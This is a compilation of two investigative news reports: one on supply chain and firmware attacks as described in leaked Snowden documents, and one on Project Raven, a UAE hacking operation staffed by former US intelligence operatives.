Nicholas Weaver, a security researcher of the International Computer Science Institute, affiliated with the University of California, Berkeley, told The Intercept, “The Bloomberg/SuperMicro story was so disturbing because an attack as described would have worked, even if at this point we can safely conclude that the Bloomberg story itself is bovine excrement. And now if I’m China, I’d be thinking, ‘I’m doing the time, might as well do the crime!’”
While the Bloomberg story painted a dramatic picture, the one that emerges from the Snowden documents is fragmented and incomplete — but grounded in the deep intelligence resources available to the U.S. government. This story is an attempt to summarize what that material has to say about supply chain attacks, from undisclosed documents we’re publishing for the first time today, documents that have been published already, and documents that have been published only in part or with little to no editorial commentary. The documents we draw on were written between 2007 and 2013; supply chain vulnerabilities have apparently been a problem for a long time.
None of the material reflects directly on Bloomberg Businessweek’s specific claims. The publication has not commented on the controversy around its reporting beyond this statement: “Bloomberg Businessweek’s investigation is the result of more than a year of reporting, during which we conducted more than 100 interviews. Seventeen individual sources, including government officials and insiders at the companies, confirmed the manipulation of hardware and other elements of the attacks. We also published three companies’ full statements, as well as a statement from China’s Ministry of Foreign Affairs. We stand by our story and are confident in our reporting and sources.”

U.S. “Critical Infrastructure” Is Vulnerable to Supply Chain Attacks
The U.S. government as a general matter takes seriously the possibility of supply chain tampering, and of China in particular conducting such meddling, including during manufacturing, according to government documents.
A classified 2011 Department of Defense “[Strategy for Operating in Cyberspace]( refers to supply chain vulnerabilities as one of the “central aspects of the cyber threat,” adding that the U.S.’s reliance on foreign factories and suppliers “provides broad opportunities for foreign actors to subvert and interdict U.S. supply chains at points of design, manufacture, service, distribution, and disposal.”
Chinese hardware providers could position themselves in U.S. industry to compromise “critical infrastructure upon which DoD depends,” according to the document.
Another classified document, a [2009 National Intelligence Estimate]( about “The Global Cyber Threat to the US Information Infrastructure,” assessed with “high confidence” that there was an increased “potential for persistent, stealthy subversions” in technology supply chains due to globalization and with “moderate confidence” that this would occur in part by tampering with manufacturing and by “taking advantage of insiders.” Such “resource-intensive tactics” would be adopted, the document claimed, to counter additional security on classified U.S. networks.
Each National Intelligence Estimate focuses on a particular issue and represents the collective judgment of all U.S. intelligence agencies, as distilled by the director of national intelligence. The 2009 NIE singled out China and Russia as “the greatest cyber threats” to the U.S. and its allies, saying that Russia had the ability to conduct supply chain operations and that China was conducting “insider access, close access, remote access, and probably supply chain operations.” In a section devoted to “Outside Reviewers’ Comments,” one such reviewer, a former executive at a maker of communications hardware, suggested that the intelligence community look more closely at the Chinese supply chain. The reviewer added:
The NIE even flagged supply chain attacks as a threat to the integrity of electronic voting machines, since the machines are “subject to many of the same vulnerabilities as other computers,” although it noted that, at the time in 2009, U.S. intelligence was not aware of any attempts “to use cyber attacks to affect U.S. elections.”
Beyond mostly vague concerns involving Russia and China, the U.S. intelligence community did not know what to make of the vulnerability of computer supply chains. Conducting such attacks was “difficult and resource-intensive,” according to the NIE, but beyond that, it had little information to understand the scope of the problem: “The unwillingness of victims and investigating agencies to report incidents” and the lack of technology to detect tampering meant that “considerable uncertainty overshadows our assessment of the threat posed by supply chain operations,” the NIE said.
A section within the 2011 Department of Defense Strategy for Operating in Cyberspace is devoted to the risk of supply chain attacks. This section describes a strategy to “manage and mitigate the risk of untrustworthy technology used by the telecommunications sector,” in part by bolstering U.S. manufacturing, to be fully operational by 2016, two years after Bloomberg said the Supermicro supply chain attack occurred. It’s not clear if the strategy ever became operational; the Defense Department, which [published]( an unclassified version of the same document, did not respond to a request for comment. But the 2009 NIE said that “exclusion of foreign software and hardware from sensitive networks and applications is already extremely difficult” and that even if an exclusion policy were successful “opportunities for subversion will still exist through front companies in the United States and adversary use of insider access in US companies.”
A third document, a [page]( on “Supply Chain Cyber Threats” from Intellipedia, an internal wiki for the U.S. intelligence community, included classified passages echoing similar worries about supply chains. A snapshot of the page from 2012 included a section, attributed to the CIA, saying that “the specter of computer hardware subversion causing weapons to fail in times of crisis, or secretly corrupting crucial data, is a growing concern. Computer chips are increasingly complex and subtle modifications made in design or manufacturing processes could be made impossible to detect with the practical means currently available.” Another passage, attributed to the Defense Intelligence Agency, flagged application servers, routers, and switches as among the hardware likely “vulnerable to the global supply chain threat” and added that “supply chain concerns will be exacerbated as U.S. providers of cybersecurity products and services are acquired by foreign firms.”
A 2012 snapshot of a different [Intellipedia page]( listed supply chain attacks first among threats to so-called air-gapped computers, which are kept isolated from the internet and are used by spy agencies to handle particularly sensitive information. The document also said that Russia “has experience with supply chain operations” and stated that “Russian software companies have set up offices in the United States, possibly to deflect attention from their Russian origins and to be more acceptable to U.S. government purchasing agents.” (Similar [concerns]( over Russian antivirus software firm Kaspersky Lab led to a recent [ban on]( the use of Kaspersky software within the U.S. government.) Kaspersky Lab has repeatedly denied that it has ties to any government and said it would not help a government with cyber espionage. Kaspersky is even [reported]( to have helped expose former NSA contractor Harold T. Martin III, who was charged with large-scale theft of classified data from the NSA.

Chinese Telecom Firm Seen as Threat
Beyond broad worries, the U.S. intelligence community had some specific concerns about China’s ability to use the supply chain for espionage.
The 2011 Defense Department strategy document said, without elaborating, that Chinese telecommunications equipment providers suspected of ties to the People’s Liberation Army “pursue inroads into the U.S. telecommunications infrastructure.”
This may be a reference, at least in part, to Huawei, the Chinese telecommunications giant that the department feared would create backdoors in equipment sold to U.S. communications providers. The NSA went as far as to hack into Huawei’s corporate communications, looking for links between the company and the People’s Liberation Army, as reported jointly [by the New York Times]( and the German news magazine Der Spiegel. The report cited no evidence linking Huawei to the People’s Liberation Army, and a spokesperson from the company told the publications it was ironic that “they are doing to us is what they have always charged that the Chinese are doing through us.”
The U.S. intelligence community appeared concerned that Huawei might help the Chinese government tap into a sensitive transatlantic telecommunications cable known as “TAT-14,” according to a [top-secret NSA briefing on Huawei]( The cable carried defense industry communication on a segment between New Jersey and Denmark; a 2008 upgrade was contracted to Mitsubishi, which “subcontracted the work Out to Huawei. Who in turn upgraded the system with a High End router of their own,” as the document put it. As a broader concern, the document added that there were indications the Chinese government might use Huawei’s “market penetration for its own SIGINT purposes” — that is, for signals intelligence. A Huawei spokesperson did not comment in time for publication.
Firmware Attacks Worry U.S. Intelligence
In other documents, spy agencies flagged another specific concern, China’s growing prowess at exploiting the BIOS, or the Basic Input/Output System. The BIOS, which is also known by the acronyms EFI and UEFI, is the first code that gets executed when a computer is powered on before launching an operating system like Windows, macOS, or Linux. The software that makes up the BIOS is stored on a chip on the computer’s motherboard, not on the hard drive; it is often referred to as “firmware” because it is tied so closely to the hardware. Like any software, the BIOS can be modified to be malicious and is a particularly good target for computer attacks because it resides outside the operating system and thus, cannot be easily detected. It is not even affected when a user erases the hard drive or installs a fresh operating system.
The Defense Intelligence Agency believed that China’s capability at exploiting the BIOS “reflects a qualitative leap forward in exploitation that is difficult to detect,” according to the “BIOS Implants” section in the [Intellipedia article]( on threats to air-gapped computers. The section further stated that “recent reporting,” presumably involving BIOS implants, “corroborates the tentative view in a 2008 national intelligence estimate that China is capable of intrusions more sophisticated than those currently observed by U.S. network defenders.”
A 2012 snapshot of another Intellipedia page, on “[BIOS Threats]( flags the BIOS’s vulnerability to supply chain meddling and insider threats. Significantly, the document also appears to refer to the U.S. intelligence community’s discovery of BIOS malware from China’s People’s Liberation Army, stating that “PLA and [[Russian]( MAKERSMARK versions do not appear to have a common link beyond the interest in developing more persistent and stealthy” forms of hacking. The “versions” mentioned appear to be instances of malicious BIOS firmware from both countries, judging from footnotes and other context in the document.
The Intellipedia page also contained indications that China may have figured out a way to compromise the BIOS software that’s manufactured by two companies, American Megatrends, commonly known as AMI, and Phoenix Technologies, which makes Award BIOS chips.
In a paragraph marked top secret, the page stated, “Among currently compromised are AMI and Award based BIOS versions. The threat that BIOS implants pose increases significantly for systems running on compromised versions.” After these two sentences, concluding the paragraph, is a footnote to a top-secret document, which The Intercept has not seen, titled “Probable Contractor to PRC People’s Liberation Army Conducts Computer Network Exploitation Against Taiwan Critical Infrastructure Networks; Develops Network Attack Capabilities.”
The word “compromised” could have different meanings in this context and does not necessarily indicate that a successful Chinese attack occurred; it could simply mean that specific versions of AMI and Phoenix’s Award BIOS software contained vulnerabilities that U.S. spies knew about. “It’s very puzzling that we haven’t seen evidence of more firmware attacks,” said Trammell Hudson, a security researcher at the hedge fund Two Sigma Investments and co-discoverer of a series of BIOS vulnerabilities in MacBooks [known]( as [Thunderstrike]( “Most every security conference debuts several new vulnerability proof-of-concepts, but … the only public disclosure of compromised firmware in the wild” came in 2015, when Kaspersky Lab announced the discovery of malicious hard drive firmware from an [advanced hacking operation]( dubbed Equation Group. “Either as an industry we’re not very good at detecting them, or these firmware attacks and hardware implants are only used in very tailored access operations.”
Hudson added, “It is quite worrisome that many systems never receive firmware updates after they ship, and the numerous embedded devices in a system are even less likely to receive updates. Any compromises against the older versions have a ‘forever day’ aspect that means that they will remain useful for adversaries against systems that might be in use for many years.”
American Megatrends issued the following statement: “The BIOS firmware industry, and computing as a whole, has taken incredible steps towards security since 2012. The information in the Snowden document concerns platforms that pre-date current BIOS-level security. We have processes in place to identify security vulnerabilities in boot firmware and promptly provide the mitigation to our OEM and ODM customers for their platforms.”
Phoenix Technologies issued the following statement: “The attacks described in the document are well-understood in the industry. Award BIOS was superseded by today’s more secure UEFI framework which contained mitigations for these types of firmware attacks many years ago.”
Successful Supply Chain Attacks by France, Germany, and the U.S.
The Snowden documents reviewed so far discuss, in often vague and uncertain terms, what U.S. intelligence believes its adversaries like China and Russia are capable of. But these documents and others also discuss in much more specific terms what the U.S. and its allies are capable of, including descriptions of specific, successful supply chain operations. They also describe in broad strokes the capabilities of various NSA programs and units against supply chains.
The Intellipedia page on [threats to air-gapped networks]( disclosed that as of 2005, Germany’s foreign intelligence agency, the BND, “has established a few commercial front companies that it would use to gain supply chain access to unidentified computer components.” The page attributes this knowledge to “information obtained during an official liaison exchange.” The page did not mention who BND’s target was or what sorts of activities the front companies were engaged in.
BND has been “setting up front companies for both HUMINT and SIGINT operations since the 1950s,” said Erich Schmidt-Eenboom, German author and BND expert, using the jargon terms for intelligence gathered both by human spies and through electronic eavesdropping, respectively. “As a rule, a full-time BND employee will found a small GmbH [company], which is responsible for a single operation. In the SIGINT area, this GmbH also maintains contacts with industrial partners.”
BND did not respond to a request for comment.
The Intellipedia page also stated that, beginning in 2002, France’s intelligence agency, DGSE, “delivered computers and fax equipment to Senegal’s security services and by 2004 could access all the information processed by these systems, according to a cooperative source with indirect access.” Senegal is a former French colony. Representatives of the Senegalese government did not respond to a request for comment. DGSE declined to comment.

Much of what’s been reported about the U.S.’s supply chain attack capabilities came from a June 2010 NSA document that The Intercept’s co-founder Glenn Greenwald published with his 2014 book “No Place to Hide.” The document, an article from an internal NSA news site called SIDtoday, was [published again]( in 2015 in Der Spiegel with fewer redactions (but without any new analysis).
SIDtoday concisely explained one NSA approach to supply chain attacks (formatting is from the original article):
Supply chain “interdiction” attacks like this involve compromising computer hardware while it’s being transported to the customer. They target a different part of the supply chain than the attack described by Bloomberg; Bloomberg’s story said Chinese spies installed malicious microchips into server motherboards while they were being manufactured at the factory, rather than while they were in transit. The NSA document said its interdiction attacks “are some of the most productive operations in TAO,” or Tailored Access Operations, NSA’s offensive hacking unit, “because they pre-position access points into hard target networks around the world.” (TAO is known today as Computer Network Operations.)
Interdicting specific shipments may carry less risk for a spy agency than implanting malicious microchips en masse at factories. “A design/manufacturing attack of the sort alleged by Bloomberg is plausible,” Eva Galperin, director of cybersecurity at the Electronic Frontier Foundation, told The Intercept. “That’s exactly why the story was such a big deal. But just because it’s plausible doesn’t mean it’s happened, and Bloomberg just didn’t bring in enough evidence, in my opinion, to support their claim.” She added, “What we do know is that a design/manufacturing attack is highly risky for the attacker and that there are many less risky alternatives that are better suited to the task at hand.”

The 2010 document also described a successful NSA attack against the state-run Syrian Telecommunications Establishment. The NSA knew the company had ordered computer network devices for its internet backbone, so the agency interdicted these devices and redirected them to a “load station,” where the agency implanted “beacons” and then placed the devices back into transit.
Several months after Syrian Telecom received the devices, one of the beacons “called back to the NSA covert infrastructure.” At that point, the NSA used its implant to survey the network where the device was installed and discovered that the device gave much greater access than expected; in addition to the internet backbone, it provided access into the national cellular network operated by Syrian Telecom, since the cellular traffic traversed the backbone.
“Since the STE GSM [cellular] network has never been exploited, this new access represented a real coup,” the author of the NSA document wrote. This allowed the NSA to “automatically exfiltrate” information about Syria Telecom cellular subscribers, including who they called, when, and their geographical locations as they carried their phones throughout the day. It also enabled the NSA to gain further access to cellular networks in the region.
Document: NSA
Another NSA document describes a different successful attack conducted by the agency. A slide from a 2013 NSA “program management review” described a [top-secret supply chain operation]( targeting a Voice-Over-IP network for classified online phone calls. At an “overseas location,” the NSA intercepted an order of equipment for this network from a manufacturer in China and compromised it with implant beacons.
“The analysis and reporting on this target identified, with high granularity, [the target’s] method of hardware procurement,” stated a presentation slide. “As a result of these efforts, NSA and its [Intelligence Community] partners are now positioned for success with future opportunities.”
NSA Operations in “Adversary Space”
In addition to information about specific supply chain operations by the U.S. and its allies, Snowden documents also include more general information about U.S. capabilities.
Computer hardware can be altered at various points along the supply chain, from design to manufacturing to storage to shipment. The U.S. is among the small number of countries that could, in theory, compromise devices at many different points in this pipeline, thanks to its resources and geographic reach.
Document: NSA
This was underlined in a [top-secret 2011 presentation]( about the Special Collection Service, a joint NSA/CIA spying program operating out of U.S. diplomatic facilities overseas. It referred to 80 global SCS sites as “points of presence” providing a “home field advantage in [the] adversary’s space,” from which “human enabled SIGINT,” can be conducted, and where supply chain “opportunities” present themselves, a suggestion that the NSA and CIA conduct supply chain attacks from U.S. embassies and consulates around the world. (The presentation was [published]( by Der Spiegel in 2014, alongside 52 other documents, and apparently never written about. The Intercept is republishing it to include the speaker notes.)
One program that goes after computer supply chains in this manner is the NSA’s SENTRY OSPREY, in which the agency uses human spies to bug digital intelligence sources, or, as the top-secret [briefing]( published by [The Intercept in 2014]( puts it, “employs its own HUMINT assets […] to support SIGINT operations,” including “close access” operations that essentially put humans right up against physical infrastructure. These operations, conducted in conjunction with partners like the CIA, FBI, and Defense Intelligence Agency, appear to have included attempts to implant bugs and compromise supply chains; a [2012 classification guide]( said they included “supply chain-enabling” and “hardware implant-enabling” — as well as “forward-based [program] presence” at sites in Beijing, as well as South Korea and Germany, all home to telecommunications manufacturers. Another program, SENTRY OWL, works “with specific foreign partners… and foreign commercial industry entities” to make devices and products “exploitable for SIGINT,” according to the briefing.
The Persistence Division
The NSA’s Tailored Access Operations played a critical role in the U.S. government’s supply chain interdiction operations. In addition to helping intercept shipments of computer hardware to secretly install hardware implants, one division of TAO, known as the “Persistence Division,” was tasked with actually creating the implants.
Document: NSA
A 2007 [top-secret presentation]( about TAO described “sophisticated” covert hacking of software, including firmware, over a computer network “or by physical interdiction,” and credits these attacks with providing U.S. spy agencies “some of their most significant successes.”
Another [document]( a 2007 NSA wiki page titled “Intern Projects,” first[published]( by Der Spiegel, described “ideas about possible future projects for the Persistence Division.” The projects described involved adding new capabilities to the NSA’s existing malicious firmware-based implants. These implants could be inserted into target computers via supply chain attacks.
One potential project proposed to expand a type of BIOS malware to work with computers running the Linux operating system and to offer more ways to exploit Windows computers.
Another suggested targeting so-called virtualization technology on computer processors, which allows the processors to more efficiently and reliably segregate so-called virtual machines, software to simulate multiple computers on a single computer. The proposed project would develop a “hypervisor implant,” indicating that it intended to target the software that coordinates the operation of virtual machines, known as the hypervisor. Hypervisors and virtual machines are used widely by cloud hosting providers. The implant would leverage support for virtual machines in both Intel and AMD processors. (Intel and AMD did not respond to requests for comment.)
Another possible project envisioned attaching a short hop radio to a hard drive’s serial port and communicating with it using a firmware implant. Yet another aimed to develop firmware implants targeting hard drives built by U.S. data storage company Seagate. (Seagate did not respond to a request for comment.)

Where to Hide Your Hardware Implant?
One of the reasons spy agencies like the NSA fear supply chain compromise is that there are so many places on a typical computer to hide a spy implant.
“Servers today have dozens of components with firmware and hundreds of active components,” said Joe FitzPatrick, a hardware security trainer and researcher. “The only way to give it a truly clean bill of health is in-depth destructive testing that depends on a ‘gold standard’ good reference to compare to — except defining that ‘gold standard’ is difficult to impossible. The much greater risk is that even perfect hardware can have vulnerable firmware and software.”
The [Intellipedia page about supply chain threats]( lists and analyzes the various pieces of hardware where a computer could be compromised, including power supplies (“could be set to … self-destruct, damage the computer’s motherboard … or even start a fire or explosion”); network cards (“well-positioned to plant malware and exfiltrate information”); disk controllers (“Better than a root kit”); and the graphics processing unit, or GPU (“well positioned to scan the computer’s screen for sensitive information”).
According to the Bloomberg report, Chinese spies connected their malicious microchip to baseboard management controllers, or BMCs, miniature computers that are hooked into servers to give administrators remote access to troubleshoot or reboot the servers.
FitzPatrick, quoted by Bloomberg, is skeptical of the Supermicro story, [including]( its description of how spies exploited the BMCs. But experts agreed that placing a backdoor into the BMC would be a good way to compromise a server. In a [follow-up story]( Bloomberg alleged that a “major U.S. telecommunications company” discovered a Supermicro server with an implant built into the Ethernet network card, which is one of the pieces of hardware listed in the Intellipedia page that’s vulnerable to supply chain attacks. FitzPatrick was, again, [skeptical]( of the claims.

After the Bloomberg story was published, in a [blog post]( on Lawfare, Weaver, the Berkeley security researcher, argued that the U.S. government should reduce the number of “components that need to execute with integrity” to only the central processing unit, or CPU, and require that that these “trusted base” components used in government systems be manufactured in the U.S., and by U.S. companies. In this way, the rest of the computer could be safely manufactured in China — systems would work securely even if components outside the trusted base, such as the motherboard, carried malicious implants. Apple’s iPhone and Intel’s Boot Guard, he argued, already work in this way. Due to the government’s purchasing power, “it should be plausible to write supply rules that, after a couple years, effectively require that U.S. government systems are built in a way that resists most supply chain attacks,” he told The Intercept.
While supply chain operations are used in real cyberattacks, they seem to be rare compared to more traditional forms of hacking, like spear-phishing and malware attacks over the internet. The NSA uses them to access “isolated or complex networks,” according to a 2007 top-secret presentation about TAO.
“Supply chain attacks are something individuals, companies, and governments need to be aware of. The potential risk needs to be weighed against other factors,” FitzPatrick said. “The reality is that most organizations have plenty of vulnerabilities that don’t require supply chain attacks to exploit.”

Special Report: Inside the UAE’s secret hacking team of U.S. mercenaries
[Christopher Bing]( [Joel Schectman](
WASHINGTON (Reuters) - Two weeks after leaving her position as an intelligence analyst for the U.S. National Security Agency in 2014, Lori Stroud was in the Middle East working as a hacker for an Arab monarchy.
She had joined Project Raven, a clandestine team that included more than a dozen former U.S. intelligence operatives recruited to help the United Arab Emirates engage in surveillance of other governments, militants and human rights activists critical of the monarchy.
Stroud and her team, working from a converted mansion in Abu Dhabi known internally as “the Villa,” would use methods learned from a decade in the U.S intelligence community to help the UAE hack into the phones and computers of its enemies.
Stroud had been recruited by a Maryland cyber security contractor to help the Emiratis launch hacking operations, and for three years, she thrived in the job. But in 2016, the Emiratis moved Project Raven to a UAE cyber security firm named DarkMatter. Before long, Stroud and other Americans involved in the effort say they saw the mission cross a red line: targeting fellow Americans for surveillance.
“I am working for a foreign intelligence agency who is targeting U.S. persons,” she told Reuters. “I am officially the bad kind of spy.”
The story of Project Raven reveals how former U.S. government hackers have employed state-of-the-art cyber-espionage tools on behalf of a foreign intelligence service that spies on human rights activists, journalists and political rivals.
Interviews with nine former Raven operatives, along with a review of thousands of pages of project documents and emails, show that surveillance techniques taught by the NSA were central to the UAE’s efforts to monitor opponents. The sources interviewed by Reuters were not Emirati citizens.
The operatives utilized an arsenal of cyber tools, including a cutting-edge espionage platform known as Karma, in which Raven operatives say they hacked into the iPhones of hundreds of activists, political leaders and suspected terrorists. Details of the Karma hack were described in a separate Reuters article today.
An NSA spokesman declined to comment on Raven. An Apple spokeswoman declined to comment. A spokeswoman for UAE’s Ministry of Foreign Affairs declined to comment. The UAE’s Embassy in Washington and a spokesman for its National Media Council did not respond to requests for comment.
The UAE has said it faces a real threat from violent extremist groups and that it is cooperating with the United States on counter-terrorism efforts. Former Raven operatives say the project helped NESA break up an ISIS network within the Emirates. When an ISIS-inspired militant stabbed to death a teacher in Abu Dhabi in 2014, the operatives say, Raven spearheaded the UAE effort to assess if other attacks were imminent.
Various reports have highlighted the ongoing cyber arms race in the Middle East, as the Emirates and other nations attempt to sweep up hacking weapons and personnel faster than their rivals. The Reuters investigation is the first to reveal the existence of Project Raven, providing a rare inside account of state hacking operations usually shrouded in secrecy and denials.
The Raven story also provides new insight into the role former American cyberspies play in foreign hacking operations. Within the U.S. intelligence community, leaving to work as an operative for another country is seen by some as a betrayal. “There’s a moral obligation if you’re a former intelligence officer from becoming effectively a mercenary for a foreign government,” said Bob Anderson, who served as executive assistant director of the Federal Bureau of Investigation until 2015.
While this activity raises ethical dilemmas, U.S. national security lawyers say the laws guiding what American intelligence contractors can do abroad are murky. Though it’s illegal to share classified information, there is no specific law that bars contractors from sharing more general spycraft knowhow, such as how to bait a target with a virus-laden email.
The rules, however, are clear on hacking U.S. networks or stealing the communications of Americans. “It would be very illegal,” said Rhea Siers, former NSA deputy assistant director for policy.
The hacking of Americans was a tightly held secret even within Raven, with those operations led by Emiratis instead. Stroud’s account of the targeting of Americans was confirmed by four other former operatives and in emails reviewed by Reuters.
The FBI is now investigating whether Raven’s American staff leaked classified U.S. surveillance techniques and if they illegally targeted American computer networks, according to former Raven employees interviewed by federal law enforcement agents. Stroud said she is cooperating with that investigation. No charges have been filed and it is possible none will emerge from the inquiry. An FBI spokeswoman declined to comment.
PURPLE BRIEFING, BLACK BRIEFING
Stroud is the only former Raven operative willing to be named in this story; eight others who described their experiences would do so only on condition of anonymity. She spent a decade at the NSA, first as a military service member from 2003 to 2009 and later as a contractor in the agency for the giant technology consultant Booz Allen Hamilton from 2009 to 2014. Her specialty was hunting for vulnerabilities in the computer systems of foreign governments, such as China, and analyzing what data should be stolen.
In 2013, her world changed. While stationed at NSA Hawaii, Stroud says, she made the fateful recommendation to bring a Dell technician already working in the building onto her team. That contractor was Edward Snowden.
“He’s former CIA, he’s local, he’s already cleared,” Stroud, 37, recalled. “He’s perfect!” Booz and the NSA would later approve Snowden’s transfer, providing him with even greater access to classified material.
Two months after joining Stroud’s group, Snowden fled the United States and passed on thousands of pages of top secret program files to journalists, detailing the agency’s massive data collection programs. In the maelstrom that followed, Stroud said her Booz team was vilified for unwittingly enabling the largest security breach in agency history.
“Our brand was ruined,” she said of her team.
In the wake of the scandal, Marc Baier, a former colleague at NSA Hawaii, offered her the chance to work for a contractor in Abu Dhabi called CyberPoint. In May 2014, Stroud jumped at the opportunity and left Booz Allen.
CyberPoint, a small cyber security contractor headquartered in Baltimore, was founded by an entrepreneur named Karl Gumtow in 2009. Its clients have included the U.S. Department of Defense, and its UAE business has gained media attention.
In an interview, Gumtow said his company was not involved in any improper actions.
Stroud had already made the switch from government employee to Booz Allen contractor, essentially performing the same NSA job at higher pay. Taking a job with CyberPoint would fulfill a lifelong dream of deploying to the Middle East and doing so at a lucrative salary. Many analysts, like Stroud, were paid more than $200,000 a year, and some managers received salaries and compensation above $400,000.
She understood her new job would involve a counterterrorism mission in cooperation with the Emiratis, a close U.S. ally in the fight against ISIS, but little else. Baier and other Raven managers assured her the project was approved by the NSA, she said. With Baier’s impressive resume, including time in an elite NSA hacking unit known as Tailored Access Operations, the pledge was convincing. Baier did not respond to multiple phone calls, text messages, emails, and messages on social media.
In the highly secretive, compartmentalized world of intelligence contracting, it isn’t unusual for recruiters to keep the mission and client from potential hires until they sign non-disclosure documents and go through a briefing process.
When Stroud was brought into the Villa for the first time, in May 2014, Raven management gave her two separate briefings, back-to-back.
In the first, known internally as the “Purple briefing,” she said she was told Raven would pursue a purely defensive mission, protecting the government of the UAE from hackers and other threats. Right after the briefing ended, she said she was told she had just received a cover story.
She then received the “Black briefing,” a copy of which was reviewed by Reuters. Raven is “the offensive, operational division of NESA and will never be acknowledged to the general public,” the Black memo says. The NESA, or National Electronic Security Authority, was the UAE’s version of the NSA.
Stroud would be part of Raven’s analysis and target-development shop, tasked with helping the government profile its enemies online, hack them and collect data. Those targets were provided by the client, NESA, now called the Signals Intelligence Agency.
The language and secrecy of the briefings closely mirrored her experience at the NSA, Stroud said, giving her a level of comfort.
The information scooped up by Raven was feeding a security apparatus that has drawn international criticism. The Emirates, a wealthy federation of seven Arab sheikhdoms with a population of 9 million, is an ally of neighbor Saudi Arabia and rival of Iran.
Like those two regional powers, the UAE has been accused of suppressing free speech, detaining dissidents and other abuses by groups such as Human Rights Watch. The UAE says it is working closely with Washington to fight extremism “beyond the battlefield” and is promoting efforts to counter the “root causes” of radical violence.
Raven’s targets eventually would include militants in Yemen, foreign adversaries such as Iran, Qatar and Turkey, and individuals who criticized the monarchy, said Stroud and eight other former Raven operatives. Their accounts were confirmed by hundreds of Raven program documents reviewed by Reuters.
Under orders from the UAE government, former operatives said, Raven would monitor social media and target people who security forces felt had insulted the government.
“Some days it was hard to swallow, like [when you target] a 16-year-old kid on Twitter,” she said. “But it’s an intelligence mission, you are an intelligence operative. I never made it personal.”
The Americans identified vulnerabilities in selected targets, developed or procured software to carry out the intrusions and assisted in monitoring them, former Raven employees said. But an Emirati operative would usually press the button on an attack. This arrangement was intended to give the Americans “plausible deniability” about the nature of the work, said former Raven members.
TARGETING ‘GYRO’ AND ‘EGRET’
Stroud discovered that the program took aim not just at terrorists and foreign government agencies, but also dissidents and human rights activists. The Emiratis categorized them as national security targets.
Following the Arab Spring protests and the ousting of Egyptian President Hosni Mubarak in 2011, Emirati security forces viewed human rights advocates as a major threat to “national stability,” records and interviews show.

One of the program’s key targets in 2012 was Rori Donaghy, according to former Raven operatives and program documents. Donaghy, then 25, was a British journalist and activist who authored articles critical of the country’s human rights record. In 2012, he wrote an opinion piece for the Guardian criticizing the UAE government’s activist crackdown and warning that, if it continued, “those in power face an uncertain future.”
Before 2012, the former operatives said, the nascent UAE intelligence-gathering operation largely relied on Emirati agents breaking into the homes of targets while they were away and physically placing spyware on computers. But as the Americans built up Raven, the remote hacking of Donaghy offered the contractors a tantalizing win they could present to the client.
Because of sensitivity over human rights violations and press freedom in the West, the operation against a journalist-activist was a gamble. “The potential risk to the UAE Government and diplomatic relations with Western powers is great if the operation can be traced back to UAE,” 2012 program documents said.
To get close to Donaghy, a Raven operative should attempt to “ingratiate himself to the target by espousing similar beliefs,” the cyber-mercenaries wrote. Donaghy would be “unable to resist an overture of this nature,” they believed.
Posing as a single human rights activist, Raven operatives emailed Donaghy asking for his help to “bring hope to those who are long suffering,” the email message said.
The operative convinced Donaghy to download software he claimed would make messages “difficult to trace.” In reality, the malware allowed the Emiratis to continuously monitor Donaghy’s email account and Internet browsing. The surveillance against Donaghy, who was given the codename Gyro, continued under Stroud and remained a top priority for the Emirates for years, Stroud said.
Donaghy eventually became aware that his email had been hacked. In 2015, after receiving another suspicious email, he contacted a security researcher at Citizen Lab, a Canadian human rights and digital privacy group, who discovered hackers had been attempting for years to breach his computer.
Reached by phone in London, Donaghy, now a graduate student pursuing Arab studies, expressed surprise he was considered a top national security target for five years. Donaghy confirmed he was targeted using the techniques described in the documents.
“I’m glad my partner is sitting here as I talk on the phone because she wouldn’t believe it,” he said. Told the hackers were American mercenaries working for the UAE, Donaghy, a British citizen, expressed surprise and disgust. “It feels like a betrayal of the alliance we have,” he said.
Stroud said her background as an intelligence operative made her comfortable with human rights targets as long as they weren’t Americans. “We’re working on behalf of this country’s government, and they have specific intelligence objectives which differ from the U.S., and understandably so,” Stroud said. “You live with it.”
Prominent Emirati activist Ahmed Mansoor, given the code name Egret, was another target, former Raven operatives say. For years, Mansoor publicly criticized the country’s war in Yemen, treatment of migrant workers and detention of political opponents.
In September 2013, Raven presented senior NESA officials with material taken from Mansoor’s computer, boasting of the successful collection of evidence against him. It contained screenshots of emails in which Mansoor discussed an upcoming demonstration in front of the UAE’s Federal Supreme Court with family members of imprisoned dissidents.
Raven told UAE security forces Mansoor had photographed a prisoner he visited in jail, against prison policy, “and then attempted to destroy the evidence on his computer,” said a Powerpoint presentation reviewed by Reuters.
Citizen Lab published research in 2016 showing that Mansoor and Donaghy were targeted by hackers — with researchers speculating that the UAE government was the most likely culprit. Concrete evidence of who was responsible, details on the use of American operatives, and first-hand accounts from the hacking team are reported here for the first time.
Mansoor was convicted in a secret trial in 2017 of damaging the country’s unity and sentenced to 10 years in jail. He is now held in solitary confinement, his health declining, a person familiar with the matter said.
Mansoor’s wife, Nadia, has lived in social isolation in Abu Dhabi. Neighbors are avoiding her out of fear security forces are watching.
They are correct. By June 2017 Raven had tapped into her mobile device and given her the code name Purple Egret, program documents reviewed by Reuters show.
To do so, Raven utilized a powerful new hacking tool called Karma, which allowed operatives to break into the iPhones of users around the world.
Karma allowed Raven to obtain emails, location, text messages and photographs from iPhones simply by uploading lists of numbers into a preconfigured system, five former project employees said. Reuters had no contact with Mansoor’s wife.
Karma was particularly potent because it did not require a target to click on any link to download malicious software. The operatives understood the hacking tool to rely on an undisclosed vulnerability in Apple’s iMessage text messaging software.
In 2016 and 2017, it would be used against hundreds of targets across the Middle East and Europe, including governments of Qatar, Yemen, Iran and Turkey, documents show. Raven used Karma to hack an iPhone used by the Emir of Qatar, Sheikh Tamim bin Hamad al-Thani, as well as the phones of close associates and his brother. The embassy of Qatar in Washington did not respond to requests for comment.
WHAT WASHINGTON KNEW
Former Raven operatives believed they were on the right side of the law because, they said, supervisors told them the mission was blessed by the U.S. government.
Although the NSA wasn’t involved in day-to-day operations, the agency approved of and was regularly briefed on Raven’s activities, they said Baier told them.
CyberPoint founder Gumtow said his company was not involved in hacking operations.
“We were not doing offensive operations. Period,” Gumtow said in a phone interview. “If someone was doing something rogue, then that’s painful for me to think they would do that under our banner.”
Instead, he said, the company trained Emiratis to defend themselves through a program with the country’s Ministry of Interior.
A review of internal Raven documents shows Gumtow’s description of the program as advising the Interior Ministry on cyber defense matches an “unclassified cover story” Raven operatives were instructed to give when asked about the project. Raven employees were told to say they worked for the Information Technology and Interoperability Office, the program document said.
